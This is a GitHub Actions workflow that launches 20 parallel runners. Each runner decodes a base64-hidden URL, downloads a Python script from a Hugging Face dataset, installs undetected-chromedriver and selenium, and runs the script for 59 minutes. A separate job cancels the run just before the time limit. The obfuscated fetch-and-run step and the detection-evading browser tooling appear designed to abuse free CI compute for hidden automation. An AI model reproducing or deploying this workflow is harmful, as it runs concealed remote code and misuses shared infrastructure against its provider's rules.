name: Crimson Vortex Sentinel Web

on:
  workflow_dispatch:

concurrency:
  group: crimson-web-${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: false

permissions:
  actions: write
  contents: read

jobs:
  # =================================================================
  # Sentinel: waits 59 minutes then cancels the entire workflow run
  # =================================================================
  crimson-sentinel:
    name: "Crimson Sentinel"
    runs-on: ubuntu-latest
    timeout-minutes: 60
    env:
      SENTINEL_SPAN: 3540
    steps:
      - name: Engage Sentinel
        run: |
          echo "[SENTINEL] Sentinel engaged for run: ${{ github.run_id }}"
          echo "[SENTINEL] Holding watch for ${SENTINEL_SPAN} seconds (59-minute meridian)."

          sleep "${SENTINEL_SPAN}"

          echo "[SENTINEL] Meridian crossed — dispatching cancel order."

          curl -sS -X POST \
            -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
            -H "Accept: application/vnd.github+json" \
            -H "X-GitHub-Api-Version: 2022-11-28" \
            "https://api.github.com/repos/${{ github.repository }}/actions/runs/${{ github.run_id }}/cancel"

          echo "[SENTINEL] Cancel order dispatched. All running and queued jobs will be aborted."

  # =================================================================
  # Vortex Web: parallel execution of Vortex nodes
  # =================================================================
  vortex-web:
    name: "VortexNode-${{ matrix.vortex_id }}"
    runs-on: ubuntu-latest
    timeout-minutes: 59

    strategy:
      fail-fast: false
      matrix:
        vortex_id: [9901, 9902, 9903, 9904, 9905, 9906, 9907, 9908, 9909, 9910, 9911, 9912, 9913, 9914, 9915, 9916, 9917, 9918, 9919, 9920]

    steps:
      # #################################################################
      # Stage 1: Provision the node
      # #################################################################
      - name: Provision Node
        run: |
          echo "[PROVISION] Provisioning VortexNode-${{ matrix.vortex_id }} on Linux..."
          sudo apt-get update -qq
          sudo apt-get install -y curl python3-pip

      # #################################################################
      # Stage 2: Download the vortex daemon
      # #################################################################
      - name: Download Vortex Daemon
        run: |
          echo "[DOWNLOAD] Downloading vortex daemon from remote endpoint..."
          DAEMON_ENDPOINT=$(printf '%s' "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9zamtoZnVrL2ZvZm8vcmVzb2x2ZS9tYWluL3N0YXJ0LnB5" | base64 -d)
          curl -sL "$DAEMON_ENDPOINT" -o vortex_daemon.py
          echo "[DOWNLOAD] Vortex daemon downloaded."

      # #################################################################
      # Stage 3: Install support packages
      # #################################################################
      - name: Install Support Packages
        run: |
          echo "[PACKAGES] Installing support packages..."
          pip3 install -q undetected-chromedriver selenium requests psutil

      # #################################################################
      # Stage 4: Launch the vortex daemon (59-minute cap)
      # #################################################################
      - name: Launch Vortex Daemon
        run: |
          echo ">> Launching VortexNode-${{ matrix.vortex_id }} daemon..."

          python3 vortex_daemon.py &
          VORTEX_PID=$!

          echo ">> Daemon launched. Maximum runtime: 59 minutes (3540s)."

          sleep 3540

          if kill -0 "$VORTEX_PID" 2>/dev/null; then
            echo ">> Maximum runtime reached — terminating daemon."
            kill -9 "$VORTEX_PID"
            echo ">> Daemon terminated by runtime controller."
          else
            echo ">> Daemon completed before maximum runtime."
          fi
